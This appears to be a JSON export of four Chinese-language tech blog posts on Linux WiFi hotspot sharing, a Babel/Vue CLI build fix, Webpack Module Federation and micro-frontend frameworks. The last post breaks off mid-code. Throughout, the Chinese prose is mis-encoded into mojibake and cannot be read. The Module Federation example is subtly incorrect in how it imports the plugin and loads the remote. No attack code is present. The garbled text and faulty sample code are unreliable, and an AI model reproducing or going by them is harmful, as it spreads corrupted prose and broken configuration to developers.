[{"content":"åœ¨Linuxç³»ç»Ÿä¸­ï¼Œéœ€è¦è¿æ¥Wifiçš„åŒæ—¶ï¼Œä¸”å¼€å¯çƒ­ç‚¹\u0026hellip;\næ³¨æ„ï¼šç›®å‰çš„ä¸¤ç§æ–¹å¼ï¼Œåœ¨deepinç³»ç»Ÿä¸­éƒ½æœªç”Ÿæ•ˆã€‚\næˆªæ­¢2024.06.01ï¼Œå®˜æ–¹ä»ç„¶ä¸æ”¯æŒ ä¸€ã€linux-wifi-hotspot ç³»ç»Ÿ Debian\nå‚è€ƒ: https://github.com/lakinduakash/linux-wifi-hotspot\næ­¥éª¤1: å®‰è£…\n$ git clone https://github.com/lakinduakash/linux-wifi-hotspot $ cd linux-wifi-hotspot # build binaries linux-wifi-hotspot $ make # install linux-wifi-hotspot $ sudo make install æ­¥éª¤2: è¿è¡Œ\nåœ¨åº”ç”¨ç¨‹åºèœå•ä¸­æœç´¢â€œWifiçƒ­ç‚¹â€æˆ–ä½¿ç”¨ç»ˆç«¯å¯åŠ¨GUI\n$ wihotspot # å¦‚æœåœ¨è¿è¡Œæ—¶ï¼Œæç¤ºæ— éšœç¢æŠ¥é”™ $ NO_AT_BRIDGE=1 sudo wihotspot æ³¨æ„ï¼š å¦‚æœä½ æƒ³è¦å¸è½½linux-wifi-hotspotï¼Œé‚£ä¹ˆè¯·æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤:\n$ sudo make uninstall äºŒã€ç»ˆç«¯å‘½ä»¤æ–¹å¼ ç³»ç»Ÿ Debian\nå‚è€ƒï¼š https://bbs.deepin.org/post/187033\næ­¥éª¤1: æ£€æŸ¥ç½‘å¡æ˜¯å¦æ”¯æŒç½‘ç»œå…±äº«\n$ iw phy # ç»ˆç«¯è¾“å…¥ # æ‰¾åˆ°è¾“å‡º # ... valid interface combinations: * #{ managed } \u0026lt;= 1, #{ AP, P2P-client, P2P-GO } \u0026lt;= 1, #{ P2P-device } \u0026lt;= 1, total \u0026lt;= 3, #channels \u0026lt;= 2 # æ³¨æ„ï¼Œæ»¡è¶³ä»¥ä¸‹è¿™äº›æ¡ä»¶ï¼Œæ‰ä»£è¡¨ç¡¬ä»¶æ”¯æŒç½‘ç»œå…±äº«: # 1.managedæ•°é‡2ä»¥ä¸Šæ›´å¥½ï¼Œè‡³å°‘æ˜¯1 # 2.AP(å³Access Point,çƒ­ç‚¹)ä¸€å®šè¦æœ‰ # 3.channelsè‡³å°‘æ˜¯2 æ­¥éª¤2: æ·»åŠ çƒ­ç‚¹\nç”¨æ¡Œé¢è‡ªå¸¦çš„ç½‘ç»œç®¡ç†ï¼Œæ‰“å¼€ç§»åŠ¨çƒ­ç‚¹(æ­¤æ—¶ï¼Œå…¶ä»–æ— çº¿è¿æ¥ä¼šè¢«åˆ‡æ–­) æ·»åŠ ä¸€ä¸ªæ— çº¿ç½‘è™šæ‹Ÿæ¥å£(interface) $ iw dev # ç»ˆç«¯è¾“å…¥: æŸ¥çœ‹ç›®å‰æœ‰çš„interfaces # è¿™é‡Œåº”è¯¥æœ‰ä¸€ä¸ª Interface \u0026lt;æ¥å£å\u0026gt; ... type AP ... # APå³ä¸ºçƒ­ç‚¹å¼€å¯çŠ¶æ€ï¼Œå¦‚æœæ˜¯æ— çº¿è¿æ¥çŠ¶æ€å°±æ˜¯managed ç»ˆç«¯è¾“å…¥ï¼Œæ·»åŠ ä¸€ä¸ªmanagedæ¥å£ï¼š\n# æ–¹å¼1 $ sudo iw dev \u0026lt;åŸæœ‰çš„é‚£ä¸ªæ¥å£å\u0026gt; interface add \u0026lt;è‡ªå·±èµ·ä¸€ä¸ªæ¥å£åï¼Œä¸è¦å’ŒåŸæ¥çš„é‡å¤\u0026gt; type managed # æ–¹å¼2 $ sudo iw phy \u0026lt;è®¾å¤‡å\u0026gt; interface add \u0026lt;è‡ªå·±èµ·ä¸€ä¸ªæ¥å£åï¼Œä¸è¦å’ŒåŸæ¥çš„é‡å¤\u0026gt; type managed # è®¾å¤‡åå¯ä»¥é€šè¿‡iw phy æŸ¥çœ‹ï¼Œåœ¨ç¬¬ä¸€è¡ŒWiphyåé¢ï¼Œä¸€èˆ¬æ˜¯phy0 lianpf@lianpf-PC:~$ iw phy Wiphy phy0 max # scan SSIDs: 20 ... æ­¥éª¤3: æ–­å¼€çƒ­ç‚¹å¹¶æ¢å¤åŸçŠ¶\næ–¹æ³•1: åˆ é™¤æ¥å£ 1.åˆ é™¤æ–°å»ºçš„interfaceï¼šsudo iw dev \u0026lt;æ–°å»ºçš„æ¥å£å\u0026gt; del 2.åœ¨æ¡Œé¢è‡ªå¸¦çš„ç½‘ç»œç®¡ç†æ–­å¼€çƒ­ç‚¹é‡æ–°è¿æ¥æ— çº¿ç½‘ æ–¹æ³•2: ç›´æ¥é‡å¯ç³»ç»Ÿå³å¯ å½“å‰æ–¹æ³•çš„åŸç†ï¼š\né™„: ä¸ºä»€ä¹ˆè¦å…ˆæ‰“å¼€çƒ­ç‚¹å†æ·»åŠ æ¥å£ï¼Ÿ åŸç†å°±æ˜¯æŠŠä¸€ä¸ªç½‘å¡å½“æˆä¸¤ä¸ªç”¨ã€‚ å› ä¸ºæˆ‘çš„è®¾å¤‡åªèƒ½åŒæ—¶ä½¿ç”¨ä¸€ä¸ªmanagedæ¥å£ï¼Œå³ä¾¿æ·»åŠ åˆ°ä¸¤ä¸ªmanagedæ¥å£ä¹Ÿåªèƒ½ä¸€ä¸ªæœç´¢wifiå’Œå¼€å¯çƒ­ç‚¹(è½¬æ¢æˆAPçŠ¶æ€)ï¼Œå¦ä¸€ä¸ªæ˜¯ä¸å¯ç”¨çŠ¶æ€ã€‚ å› æ­¤å¦‚æœä½ æ”¯æŒæ›´å¤šmanagedæ¥å£ï¼Œå°±æ²¡æœ‰è¿™ä¸ªé™åˆ¶ã€‚ï¼ˆiwå®é™…ä¸Šå…è®¸APçŠ¶æ€çš„æ¥å£ä¸è½¬æ¢å›managedæ—¶å…³é—­çƒ­ç‚¹ï¼Œçœ‹iw dev ap starté‚£ä¸ªè¶…é•¿çš„å‘½ä»¤ï¼‰ é™„: å¦‚ä½•ä¿®æ”¹çƒ­ç‚¹å(SSID)å’Œå¯†ç ï¼Ÿ è‡ªå¸¦çš„æ§åˆ¶ä¸­å¿ƒå¯æ”¹ å‘½ä»¤æ•´åˆï¼š\n# 1.æŸ¥çœ‹ã€å½“å‰ã€‘æ— çº¿ç½‘è™šæ‹Ÿæ¥å£ lianpf@lianpf-PC:~$ iw dev phy#0 Unnamed/non-netdev interface ... Interface wlp0s20f3 ... type managed channel 52 (5260 MHz), width: 40 MHz, center1: 5270 MHz ... # 2.æ¡Œé¢è‡ªå¸¦ç½‘å…³ç®¡ç†æ‰“å¼€ç§»åŠ¨çƒ­ç‚¹ # 3.æŸ¥çœ‹ã€å½“å‰ã€‘æ— çº¿ç½‘è™šæ‹Ÿæ¥å£ - å·²è¿æ¥ç»™çƒ­ç‚¹ lianpf@lianpf-PC:~$ iw dev phy#0 Unnamed/non-netdev interface ... Interface wlp0s20f3 # æ³¨æ„è¿™é‡Œ ... type AP # æ³¨æ„ç±»å‹ ... # 4.æ·»åŠ ä¸€ä¸ªæ–°çš„managedæ¥å£ $ sudo iw dev wlp0s20f3 interface add wlp5s0 type managed å‚è€ƒ https://github.com/lakinduakash/linux-wifi-hotspot æœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/computer-basics/linux-app-hotspot/","summary":"\u003cp\u003eåœ¨\u003ccode\u003eLinux\u003c/code\u003eç³»ç»Ÿä¸­ï¼Œéœ€è¦è¿æ¥\u003ccode\u003eWifi\u003c/code\u003eçš„åŒæ—¶ï¼Œä¸”å¼€å¯çƒ­ç‚¹\u0026hellip;\u003c/p\u003e","title":"Linuxåº”ç”¨: çƒ­ç‚¹ hotspot"},{"content":"æ‘˜è¦\u0026hellip;\nä¸€ã€è¯­æ³•é—®é¢˜ å¾…è¡¥å……\u0026hellip;\näºŒã€æ„å»ºç¼–è¯‘é—®é¢˜ 1.å¯¹ node_modules ç›®å½•ä¸­çš„æ–‡ä»¶ï¼Œå¦‚ä½•è¿›è¡Œå¤„ç†? åœºæ™¯: Vue CLI\né—®é¢˜æè¿°ï¼šModule parse failed: Unexpected token ä½¿ç”¨Vue CLIæ„å»ºæ—¶ï¼Œå½“ä½ éœ€è¦å¯¹ node_modules ç›®å½•ä¸­çš„æ–‡ä»¶è¿›è¡Œå¤„ç† ï¼Œå¯ä»¥åœ¨ vue.config.js æ–‡ä»¶ä¸­ä½¿ç”¨ chainWebpack æ–¹æ³•ï¼Œè‡ªå®šä¹‰Webpacké…ç½®ã€‚\néœ€è¦å°†ä»¥ä¸‹Webpacké…ç½®è½¬æ¢ä¸ºVue CLIé…ç½®ï¼š module.exports = { module: { rules: [ { test: /\\.js$/, loader: \u0026#39;babel-loader\u0026#39;, exclude: /node_modules/ }, { test: /\\.vue$/, loader: \u0026#39;vue-loader\u0026#39; } ] } } å¦‚ä½•è§£å†³ï¼š ç¡®ä¿å®‰è£…å¿…è¦çš„ä¾èµ– npm install --save-dev babel-loader @babel/core @babel/preset-env vue-loader vue-template-compiler åœ¨é¡¹ç›®æ ¹ç›®å½•ä¸‹ï¼Œåˆ›å»ºæˆ–æ›´æ–° .babelrc æ–‡ä»¶ { \u0026#34;presets\u0026#34;: [ [\u0026#34;@babel/preset-env\u0026#34;, { \u0026#34;targets\u0026#34;: { \u0026#34;node\u0026#34;: \u0026#34;current\u0026#34; } }] ] } åœ¨é¡¹ç›®æ ¹ç›®å½•ä¸‹ï¼Œåˆ›å»ºæˆ–æ›´æ–° vue.config.js æ–‡ä»¶ï¼Œä»¥åŒ…å«ä»¥ä¸‹é…ç½®ï¼š module.exports = { chainWebpack: config =\u0026gt; { // ä¸º .js æ–‡ä»¶æ·»åŠ  babel-loaderï¼Œå¹¶æ’é™¤ node_modules config.module .rule(\u0026#39;js\u0026#39;) .test(/\\.js$/) .exclude .add(filepath =\u0026gt; { // æ’é™¤ node_modules ä¸­çš„å…¶ä»–æ–‡ä»¶ï¼Œä½†åŒ…æ‹¬æŒ‡å®šçš„è·¯å¾„ return /node_modules/.test(filepath) \u0026amp;\u0026amp; !/node_modules[\\\\/]@lianpf[\\\\/]native-sdk/.test(filepath); }) .end() .use(\u0026#39;babel-loader\u0026#39;) .loader(\u0026#39;babel-loader\u0026#39;) .options({ presets: [\u0026#39;@babel/preset-env\u0026#39;], }) .end(); // å¤„ç† node_modules ä¸­çš„ç‰¹å®šæ–‡ä»¶ config.module .rule(\u0026#39;js-in-node_modules\u0026#39;) .test(/\\.js$/) .include .add(/node_modules[\\\\/]@lianpf[\\\\/]native-sdk/) .end() .use(\u0026#39;babel-loader\u0026#39;) .loader(\u0026#39;babel-loader\u0026#39;) .options({ presets: [\u0026#39;@babel/preset-env\u0026#39;], }) .end(); } }; å®Œæˆä¸Šè¿°é…ç½®åï¼Œé‡å¯ï¼š npm run serve ç»“è®º ï¼š\né€šè¿‡ä»¥ä¸Šé…ç½®ï¼Œæˆ‘ä»¬ç¡®ä¿ Babel å¤„ç† node_modules/@lianpf/native-sdk ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œä»è€Œæ”¯æŒç°ä»£ JavaScript è¯­æ³•ï¼ˆå¦‚å¯é€‰é“¾ ?.ï¼‰ã€‚å¦‚æœä»ç„¶é‡åˆ°é—®é¢˜ï¼Œè¯·ç¡®ä¿æ‰€æœ‰ä¾èµ–é¡¹å·²æ­£ç¡®å®‰è£…ï¼Œå¹¶ä¸”æ²¡æœ‰æ‹¼å†™æˆ–è¯­æ³•é”™è¯¯ã€‚\nå‚è€ƒ \u0026hellip; æœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/frontend-develop/frontengine-babel-faq/","summary":"\u003cp\u003eæ‘˜è¦\u0026hellip;\u003c/p\u003e","title":"å‰ç«¯å·¥ç¨‹åŒ–: babelçš„ä¸€äº›å¸¸è§é—®é¢˜"},{"content":" ä¸€ã€æ¨¡å—è”é‚¦ æ¨¡å—è”é‚¦ (Module Federation) æ˜¯ Webpack 5 ä¸­çš„ä¸€ä¸ªæ–°ç‰¹æ€§ï¼Œå®ƒå…è®¸å°†å¤šä¸ª Webpack åº”ç”¨ç¨‹åºæ‰“åŒ…æˆä¸€ä¸ªæ•´ä½“ï¼Œå¹¶åœ¨è¿è¡Œæ—¶åŠ¨æ€åŠ è½½å’Œå¸è½½æ¨¡å— ã€‚è¿™ä½¿å¾—å¼€å‘äººå‘˜å¯ä»¥å°†å¤§å‹åº”ç”¨ç¨‹åºåˆ†è§£æˆæ›´å°çš„æ¨¡å—ï¼Œå¹¶ç‹¬ç«‹å¼€å‘å’Œéƒ¨ç½²è¿™äº›æ¨¡å—ã€‚\næ¨¡å—è”é‚¦çš„ä¸»è¦åŠŸèƒ½åŒ…æ‹¬:\nä»£ç å…±äº«: å…è®¸å¤šä¸ªåº”ç”¨ç¨‹åºå…±äº«ä»£ç å’Œèµ„æºï¼Œä»è€Œå‡å°‘ä»£ç å†—ä½™å¹¶æé«˜å¼€å‘æ•ˆç‡ã€‚ åŠ¨æ€åŠ è½½: å…è®¸åœ¨è¿è¡Œæ—¶åŠ¨æ€åŠ è½½å’Œå¸è½½æ¨¡å—ï¼Œä»è€Œæé«˜åº”ç”¨ç¨‹åºçš„çµæ´»æ€§å’Œæ€§èƒ½ã€‚ è¿œç¨‹ä¾èµ–: å…è®¸åº”ç”¨ç¨‹åºåŠ è½½æ¥è‡ªè¿œç¨‹æœåŠ¡å™¨çš„æ¨¡å—ï¼Œä»è€Œå®ç°æ¨¡å—çš„æŒ‰éœ€åŠ è½½ã€‚ æ¨¡å—è”é‚¦çš„åº”ç”¨åœºæ™¯:\nå¾®å‰ç«¯: å¯ä»¥ä½¿ç”¨æ¨¡å—è”é‚¦å°†å¤§å‹å‰ç«¯åº”ç”¨ç¨‹åºåˆ†è§£æˆæ›´å°çš„å¾®å‰ç«¯åº”ç”¨ç¨‹åºï¼Œå¹¶ç‹¬ç«‹å¼€å‘å’Œéƒ¨ç½²è¿™äº›å¾®å‰ç«¯åº”ç”¨ç¨‹åºã€‚ å…±äº«ç»„ä»¶åº“: å¯ä»¥å°†å…±äº«ç»„ä»¶åº“æ„å»ºæˆä¸€ä¸ªæ¨¡å—è”é‚¦åº”ç”¨ç¨‹åºï¼Œå¹¶å°†å…¶éƒ¨ç½²åˆ°è¿œç¨‹æœåŠ¡å™¨ï¼Œç„¶åå…¶ä»–åº”ç”¨ç¨‹åºå¯ä»¥åŠ¨æ€åŠ è½½è¯¥ç»„ä»¶åº“ã€‚ å¤šæ¨¡å—åº”ç”¨ç¨‹åº: å¯ä»¥ä½¿ç”¨æ¨¡å—è”é‚¦å°†å¤šæ¨¡å—åº”ç”¨ç¨‹åºæ‰“åŒ…æˆä¸€ä¸ªæ•´ä½“ï¼Œå¹¶åœ¨è¿è¡Œæ—¶åŠ¨æ€åŠ è½½å’Œå¸è½½æ¨¡å—ï¼Œä»è€Œæé«˜åº”ç”¨ç¨‹åºçš„çµæ´»æ€§å’Œæ€§èƒ½ã€‚ 1.1 æ¨¡å—è”é‚¦çš„ç¤ºä¾‹ ä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„æ¨¡å—è”é‚¦ç¤ºä¾‹ï¼Œå…¶ä¸­åŒ…å«ä¸¤ä¸ªåº”ç”¨ç¨‹åº:\nä¸»åº”ç”¨ç¨‹åº: ä¸»åº”ç”¨ç¨‹åºè´Ÿè´£åŠ è½½å’Œå¸è½½å­åº”ç”¨ç¨‹åºã€‚ å­åº”ç”¨ç¨‹åº: å­åº”ç”¨ç¨‹åºæ˜¯ä¸€ä¸ªç‹¬ç«‹çš„ Webpack åº”ç”¨ç¨‹åºï¼Œå¯ä»¥è¢«ä¸»åº”ç”¨ç¨‹åºåŠ¨æ€åŠ è½½ã€‚ // ä¸»åº”ç”¨ç¨‹åº import { ModuleFederationPlugin } from \u0026#39;webpack\u0026#39;; const config = { entry: \u0026#39;./main.js\u0026#39;, output: { filename: \u0026#39;main.js\u0026#39;, }, plugins: [ new ModuleFederationPlugin({ remotes: { \u0026#39;./sub-app\u0026#39;: \u0026#39;http://localhost:3000/sub-app.js\u0026#39;, }, }), ], }; export default config; // å­åº”ç”¨ç¨‹åº import { ModuleFederationPlugin } from \u0026#39;webpack\u0026#39;; const config = { entry: \u0026#39;./sub-app.js\u0026#39;, output: { filename: \u0026#39;sub-app.js\u0026#39;, }, plugins: [ new ModuleFederationPlugin({ name: \u0026#39;sub-app\u0026#39;, library: { type: \u0026#39;var\u0026#39;, name: \u0026#39;subApp\u0026#39; }, exposes: { \u0026#39;./component\u0026#39;: \u0026#39;./component.js\u0026#39;, }, }), ], }; export default config; åœ¨è¯¥ç¤ºä¾‹ä¸­ï¼Œä¸»åº”ç”¨ç¨‹åºå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼åŠ è½½å­åº”ç”¨ç¨‹åº:\nconst subApp = await import(\u0026#39;http://localhost:3000/sub-app.js\u0026#39;); // ä½¿ç”¨å­åº”ç”¨ç¨‹åºä¸­çš„ç»„ä»¶ const component = subApp.component; äºŒã€vite ç›¸å…³ æ”¯æŒæ¨¡å—è”é‚¦Module Federationçš„Vite/Rollupæ’ä»¶ï¼Œå¯ä¸Webpack Module Federationå…¼å®¹: vite-plugin-federation æ›´å¤šå†…å®¹ï¼Œå¾…è¡¥å……\u0026hellip;\nå‚è€ƒ Webpack å®˜æ–¹æ–‡æ¡£ - æ¨¡å—è”é‚¦: https://webpack.docschina.org/concepts/module-federation/ æ¨¡å—è”é‚¦ç¤ºä¾‹: https://github.com/kavience/module-federation-demo æœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/frontend-develop/buildtool-modulefederation/","summary":"ä¸€ã€æ¨¡å—è”é‚¦ æ¨¡å—è”é‚¦ (Module Federation) æ˜¯ Webpack 5 ä¸­çš„ä¸€ä¸ªæ–°ç‰¹æ€§ï¼Œå®ƒå…è®¸å°†å¤šä¸ª Webpack","title":"å·¥ç¨‹åŒ–: æ¨¡å—è”é‚¦Module Federationæœºåˆ¶"},{"content":"ç³»åˆ—æ–‡ç« ï¼š\nç¬¬ä¸€ç¯‡ï¼šå¾®å‰ç«¯: qiankunã€wujieå’ŒMicro Appç­‰æ¡†æ¶å¯¹æ¯” å¾®å‰ç«¯æ¶æ„ä¸»è¦è§£å†³å•ä½“åº”ç”¨ï¼ˆå¸¸è§äºä¼ä¸šçº§ Web åº”ç”¨ï¼‰åœ¨ä¸€ä¸ªç›¸å¯¹é•¿çš„æ—¶é—´è·¨åº¦ä¸‹ï¼Œç”±äºå‚ä¸çš„äººå‘˜ã€å›¢é˜Ÿçš„å¢å¤šã€å˜è¿ï¼Œä»ä¸€ä¸ªæ™®é€šåº”ç”¨æ¼”å˜æˆä¸€ä¸ª å·¨çŸ³åº”ç”¨(Frontend Monolith) åï¼Œåº”ç”¨ä¸å¯ç»´æŠ¤çš„é—®é¢˜ã€‚\nåœ¨å„å¤§å¾®å‰ç«¯è§£å†³æ–¹æ¡ˆå‡ºç°å‰ï¼Œé€šå¸¸ç”¨iframeè§£å†³è¿™ç±»é—®é¢˜ã€‚æœ¬æ–‡é¦–å…ˆä»iframeå’Œå¾®å‰ç«¯æ¶æ„çš„è§†è§’ï¼Œå»å¯¹æ¯”ä¸‹åŸç†ã€‚å…¶æ¬¡ï¼Œå¯¹æ¯”ç°æœ‰çš„å„å¤§å¾®å‰ç«¯æ¡†æ¶\nä¸€ã€iframe vs å¾®å‰ç«¯æ¶æ„ 1.iframe iframeæä¾›äº†æµè§ˆå™¨åŸç”Ÿçš„ç¡¬éš”ç¦»æ–¹æ¡ˆ ï¼Œä¸è®ºæ˜¯ã€å·¨çŸ³åº”ç”¨ã€‘çš„æ ·å¼éš”ç¦»ã€jséš”ç¦»é—®é¢˜éƒ½èƒ½è¢«å®Œç¾è§£å†³ã€‚ ä½†æœ€å¤§é—®é¢˜ä¹Ÿåœ¨äºiframeçš„éš”ç¦»æ€§æ— æ³•è¢«çªç ´ï¼Œå¯¼è‡´åº”ç”¨é—´ä¸Šä¸‹æ–‡æ— æ³•è¢«å…±äº«ï¼Œå¸¦æ¥å¼€å‘å’Œäº§å“ä½“éªŒçš„é—®é¢˜ï¼š\nurlä¸åŒæ­¥: æµè§ˆå™¨åˆ·æ–°iframe urlçŠ¶æ€ä¸¢å¤±ã€åé€€å‰è¿›æŒ‰é’®æ— æ³•ä½¿ç”¨ UIä¸åŒæ­¥: DOMç»“æ„ä¸å…±äº«ï¼Œå¼¹çª—åªèƒ½åœ¨iframeå†…éƒ¨å±•ç¤ºï¼Œæ— æ³•è¦†ç›–å…¨å±€ éš”ç¦»é—®é¢˜: å…¨å±€ä¸Šä¸‹æ–‡å®Œå…¨éš”ç¦»ï¼Œå†…å­˜å˜é‡ä¸å…±äº«ï¼Œiframeå†…å¤–ç³»ç»Ÿçš„é€šä¿¡ã€æ•°æ®åŒæ­¥ç­‰éœ€æ±‚ï¼Œä¸»åº”ç”¨çš„cookieè¦é€ä¼ åˆ°æ ¹åŸŸåéƒ½ä¸åŒçš„å­åº”ç”¨ä¸­å®ç°å…ç™»æ•ˆæœ æ…¢: æ¯æ¬¡å­åº”ç”¨è¿›å…¥éƒ½æ˜¯ä¸€æ¬¡æµè§ˆå™¨ä¸Šä¸‹æ–‡é‡å»ºã€èµ„æºé‡æ–°åŠ è½½çš„è¿‡ç¨‹ 2.å¾®å‰ç«¯æ¶æ„ å¾®å‰ç«¯æ¡†æ¶å†…çš„å„ä¸ªåº”ç”¨éƒ½æ”¯æŒç‹¬ç«‹å¼€å‘éƒ¨ç½²ã€ä¸é™æŠ€æœ¯æ¡†æ¶ã€æ”¯æŒç‹¬ç«‹è¿è¡Œã€åº”ç”¨çŠ¶æ€éš”ç¦»ä½†ä¹Ÿå¯å…±äº«ç­‰ç‰¹å¾ã€‚\näºŒã€å¾®å‰ç«¯æ¶æ„ æ¡†æ¶1: single-spa single-spaæ˜¯æœ€æ—©çš„å¾®å‰ç«¯æ¡†æ¶ï¼Œå…¼å®¹å¤šç§å‰ç«¯æŠ€æœ¯æ ˆï¼Œæ”¯æŒå°†å¤šä¸ªå•é¡µé¢åº”ç”¨èšåˆä¸ºä¸€ä¸ªæ•´ä½“åº”ç”¨çš„ã€‚\nç®€å•æ¥è¯´å°±æ˜¯ã€èšåˆã€‘ï¼Œè¯¥åº“å¯è®©ä½ çš„åº”ç”¨ä½¿ç”¨å¤šä¸ªä¸åŒçš„æŠ€æœ¯æ ˆï¼ˆvueã€reactã€angularç­‰)è¿›è¡ŒåŒæ­¥å¼€å‘ï¼Œæœ€åä½¿ç”¨ä¸€ä¸ªå…¬ç”¨çš„è·¯ç”±å»å®ç°å®Œç¾çš„åˆ‡æ¢\n1.å®ç°æ–¹æ¡ˆ single-spaå®ç°äº†ä¸€å¥— ã€ç”Ÿå‘½å‘¨æœŸã€‘ï¼Œå¼€å‘è€…éœ€åœ¨ç›¸åº”çš„æ—¶æœºè‡ªå·±å»åŠ è½½å¯¹åº”çš„å­åº”ç”¨ã€‚å®ƒåšçš„äº‹æƒ…å°±æ˜¯ï¼šæ³¨å†Œå­åº”ç”¨ã€ç›‘å¬URLå˜åŒ–ï¼Œç„¶ååŠ è½½å¯¹åº”çš„å­åº”ç”¨jsï¼Œæ‰§è¡Œå¯¹åº”å­åº”ç”¨çš„ç”Ÿå‘½å‘¨æœŸæµç¨‹ã€‚\næä¾›registerApplicationæ–¹æ³•ï¼Œç”¨æ¥æ³¨å†Œå­åº”ç”¨åˆ—è¡¨ æä¾›activeWhenï¼Œç”±å¼€å‘è€…æŒ‡å®šè·¯ç”±æ»¡è¶³æ¡ä»¶æ—¶ï¼Œæ¿€æ´»ï¼ˆæŒ‚è½½ï¼‰å­åº”ç”¨çš„jsã€cssã€‚ jséš”ç¦»ç”±single-spa-leaked-globalså®ç° æœ¬è´¨ä¸Šå°±æ˜¯åœ¨ mount A å­åº”ç”¨æ—¶ï¼Œæ­£å¸¸æ·»åŠ å…¨å±€å˜é‡ï¼Œæ¯”å¦‚ jQuery çš„ $, lodash çš„ _ã€‚åœ¨ unmount A å­åº”ç”¨æ—¶ï¼Œç”¨ä¸€ä¸ªå¯¹è±¡è®°å½•ä¹‹å‰ç»™ window æ·»åŠ çš„å…¨å±€å˜é‡ï¼Œå¹¶æŠŠ A åº”ç”¨é‡Œæ·»åŠ  window çš„å˜é‡éƒ½åˆ æ‰ã€‚ä¸‹ä¸€æ¬¡å† mount A åº”ç”¨æ—¶ï¼ŒæŠŠè®°å½•çš„å…¨å±€å˜é‡é‡æ–°åŠ å›æ¥ã€‚ csséš”ç¦»ï¼š å­åº”ç”¨ä¹‹é—´é€šè¿‡single-spa-cssæ’ä»¶æä¾›çš„cssç”Ÿå‘½å‘¨æœŸå‡½æ•°ï¼Œåšåˆ°å­åº”ç”¨mountæ—¶åŠ è½½cssï¼Œå­åº”ç”¨unmountæ—¶å°†css unmountæ‰ ä¸»åº”ç”¨ä¸å­åº”ç”¨ä¹‹é—´å¯é€šè¿‡PostCSSPrefix Selectorç»™æ ·å¼è‡ªåŠ¨åŠ å‰ç¼€çš„æ–¹å¼ï¼Œæˆ–Shadow DOMçš„å½¢å¼å»è§£å†³ã€‚ 2.single-spaå®æˆ˜ i.ä¸»åº”ç”¨å…¥å£æ–‡ä»¶ ä¸»è¦é€šè¿‡single-spaæä¾›çš„registerApplicationæ–¹æ³•æ³¨å†Œå­åº”ç”¨ï¼Œå­åº”ç”¨éœ€è¦æŒ‡å®šåŠ è½½å­åº”ç”¨çš„æ–¹æ³•ã€å’Œè·¯ç”±æ¡ä»¶\nimport Vue from \u0026#39;vue\u0026#39; import App from \u0026#39;./App.vue\u0026#39; import router from \u0026#39;./router\u0026#39; import { registerApplication, start } from \u0026#39;single-spa\u0026#39; Vue.config.productionTip = false // è¿œç¨‹åŠ è½½å­åº”ç”¨ function createScript(url) { return new Promise((resolve, reject) =\u0026gt; { const script = document.createElement(\u0026#39;script\u0026#39;) script.src = url script.onload = resolve script.onerror = reject const firstScript = document.getElementsByTagName(\u0026#39;script\u0026#39;)[0] firstScript.parentNode.insertBefore(script, firstScript) }) } // åŠ è½½å‡½æ•°ï¼Œè¿”å›ä¸€ä¸ª promise function loadApp(url, globalVar) { // æ”¯æŒè¿œç¨‹åŠ è½½å­åº”ç”¨ return async () =\u0026gt; { await createScript(url + \u0026#39;/js/chunk-vendors.js\u0026#39;) await createScript(url + \u0026#39;/js/app.js\u0026#39;) // è¿™é‡Œçš„returnå¾ˆé‡è¦ï¼Œéœ€è¦ä»è¿™ä¸ªå…¨å±€å¯¹è±¡ä¸­æ‹¿åˆ°å­åº”ç”¨æš´éœ²å‡ºæ¥çš„ç”Ÿå‘½å‘¨æœŸå‡½æ•° return window[globalVar] } } // å­åº”ç”¨åˆ—è¡¨ const apps = [ { // å­åº”ç”¨åç§° name: \u0026#39;app1\u0026#39;, // å­åº”ç”¨åŠ è½½å‡½æ•°ï¼Œæ˜¯ä¸€ä¸ªpromise app: loadApp(\u0026#39;http://localhost:8081\u0026#39;, \u0026#39;app1\u0026#39;), // 